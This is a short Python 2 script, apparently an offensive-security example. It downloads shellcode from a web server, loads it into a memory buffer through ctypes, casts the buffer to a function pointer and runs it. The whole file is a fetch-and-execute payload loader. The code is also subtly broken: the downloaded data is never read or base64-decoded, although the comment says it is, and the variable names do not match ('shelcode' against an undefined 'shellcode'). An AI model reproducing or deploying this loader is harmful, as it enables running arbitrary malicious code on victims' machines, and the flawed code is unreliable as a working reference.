import urllib2
import ctypes
import base64

#retrieve the shellcode from our web server
url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

#decode a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shelcode, len(shellcode))

#create a function pointer to our shellcode
shellcode_func = ctypes.cast(shellcode_buffer,ctypes.CFUNCTYPE(ctypes.c_void_p))

#call our shellcode
shellcode_func()
